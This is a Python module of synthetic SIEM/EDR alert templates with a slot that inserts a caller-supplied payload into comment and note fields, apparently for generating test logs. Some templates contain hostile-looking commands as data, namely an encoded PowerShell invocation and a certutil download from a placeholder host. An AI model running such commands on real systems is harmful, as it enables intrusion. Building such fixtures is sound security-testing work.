"""SIEM alert templates (Splunk / Elastic style)."""
from __future__ import annotations

import random

TEMPLATES = [
    (
        "timestamp=2025-07-20T14:22:11Z src_ip=10.0.4.17 dst_ip=203.0.113.42 "
        "user=svc_backup event=Process\\Create process=powershell.exe "
        "cmdline=\"powershell -enc SQBFAFgA\" severity=medium comment={payload}"
    ),
    (
        "[EDR-ALERT] host=WIN-SRV-08 rule=SuspiciousLolBins pid=4820 "
        "parent=explorer.exe child=certutil.exe args=\"-urlcache -f http://x/y\" "
        "annotation={payload}"
    ),
    (
        "id=93211 alert=BruteForce user=admin src=198.51.100.9 attempts=42 "
        "window=5m tag=auth notes={payload}"
    ),
    (
        "sourcetype=firewall action=denied src=10.1.2.3 dst=8.8.8.8 port=53 "
        "proto=udp reason=policy analyst_comment={payload}"
    ),
    (
        "dataset=proxy user=jdoe host=laptop-14 url=hxxp://malicious.example/js "
        "category=uncategorised verdict=block reviewer_note={payload}"
    ),
]


def render(rng: random.Random | None = None, payload: str = "n/a") -> str:
    rng = rng or random.Random()
    tpl = rng.choice(TEMPLATES)
    return tpl.format(payload=payload)
